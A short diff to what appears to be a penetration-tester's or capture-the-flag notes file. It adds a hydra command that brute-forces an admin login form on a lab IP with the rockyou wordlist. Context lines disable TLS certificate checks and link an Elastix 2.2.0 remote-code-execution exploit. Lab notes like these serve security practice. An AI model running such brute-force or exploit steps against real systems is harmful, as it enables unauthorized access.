@@ -230,6 +230,10 @@ ctx = ssl.create_default_context()
 ctx.check_hostname = False  
 ctx.verify_mode = ssl.CERT_NONE  
 
+#hydra bruteforce form  
+hydra 10.10.10.43 -l admin -P ./../rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V  
+
+
 #Elastix 2.2.0 RCE  
 https://www.exploit-db.com/exploits/18650/  
 #find SIP num  
